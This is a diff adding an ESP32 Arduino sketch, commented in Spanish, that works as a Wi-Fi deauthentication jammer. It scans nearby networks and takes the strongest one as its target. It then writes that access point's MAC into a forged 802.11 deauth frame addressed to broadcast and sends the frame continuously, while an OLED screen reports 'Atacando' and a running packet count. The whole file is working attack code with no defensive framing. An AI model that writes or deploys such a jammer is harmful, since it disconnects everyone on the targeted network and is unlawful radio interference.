@@ -1,0 +1,116 @@
+#include <WiFi.h>
+#include "esp_wifi.h"
+#include <U8g2lib.h>
+#include <Wire.h>
+
+// Pines I2C para ESP32
+#define OLED_SDA 21
+#define OLED_SCL 22
+
+U8G2_SSD1306_128X64_NONAME_F_HW_I2C display(U8G2_R0, /* reset=*/ U8X8_PIN_NONE, OLED_SCL, OLED_SDA);
+
+// Configuración regional
+const wifi_country_t wifi_country = {
+  cc: "US", schan: 1, nchan: 13, policy: WIFI_COUNTRY_POLICY_MANUAL
+};
+
+// Paquete Deauth
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00, 0x3A, 0x01,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // destino: broadcast
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // fuente
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID
+  0x00, 0x00, 0x07, 0x00               // razón
+};
+
+uint8_t apMac[6];
+int apChannel = 1;
+String apSSID = "";
+unsigned long packetCount = 0;
+
+void setMac(uint8_t* mac) {
+  memcpy(&deauthPacket[10], mac, 6);  // Fuente
+  memcpy(&deauthPacket[16], mac, 6);  // BSSID
+}
+
+void showMessage(String l1, String l2 = "", String l3 = "") {
+  display.clearBuffer();
+  display.setFont(u8g2_font_6x10_tr);
+  if (l1 != "") display.drawStr(0, 12, l1.c_str());
+  if (l2 != "") display.drawStr(0, 24, l2.c_str());
+  if (l3 != "") display.drawStr(0, 36, l3.c_str());
+  display.sendBuffer();
+}
+
+void scanNetworks() {
+  showMessage("Escaneando redes...");
+  WiFi.mode(WIFI_MODE_STA);
+  WiFi.disconnect(true);
+  delay(1000);
+
+  int n = WiFi.scanNetworks(false, true);
+
+  if (n == 0) {
+    showMessage("No se", "encontraron redes");
+    while (1);
+  }
+
+  int bestIndex = 0;
+  int bestRSSI = WiFi.RSSI(0);
+
+  for (int i = 1; i < n; i++) {
+    if (WiFi.RSSI(i) > bestRSSI) {
+      bestRSSI = WiFi.RSSI(i);
+      bestIndex = i;
+    }
+  }
+
+  apSSID = WiFi.SSID(bestIndex);
+  apChannel = WiFi.channel(bestIndex);
+  WiFi.BSSID(bestIndex, apMac);
+
+  setMac(apMac);
+
+  showMessage("Objetivo:", apSSID, "Canal: " + String(apChannel));
+  delay(3000);
+}
+
+void setup() {
+  Serial.begin(115200);
+  Wire.begin(OLED_SDA, OLED_SCL);
+  display.begin();
+  display.clearBuffer();
+  display.setFont(u8g2_font_6x10_tr);
+  display.drawStr(0, 12, "Iniciando...");
+  display.sendBuffer();
+
+  scanNetworks();
+
+  WiFi.mode(WIFI_MODE_STA);
+  esp_wifi_set_country(&wifi_country);
+  esp_wifi_set_channel(apChannel, WIFI_SECOND_CHAN_NONE);
+
+  showMessage("Lanzando", "ataque jammer...");
+  delay(1500);
+}
+
+void loop() {
+  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
+  packetCount++;
+
+  if (packetCount % 50 == 0) {
+    display.clearBuffer();
+    display.setFont(u8g2_font_6x10_tr);
+    display.setCursor(0, 12);
+    display.print("Atacando:");
+    display.setCursor(0, 24);
+    display.print(apSSID);
+    display.setCursor(0, 36);
+    display.print("Paquetes:");
+    display.setCursor(0, 48);
+    display.print(packetCount);
+    display.sendBuffer();
+  }
+
+  delay(100);  // 10 veces por segundo
+}
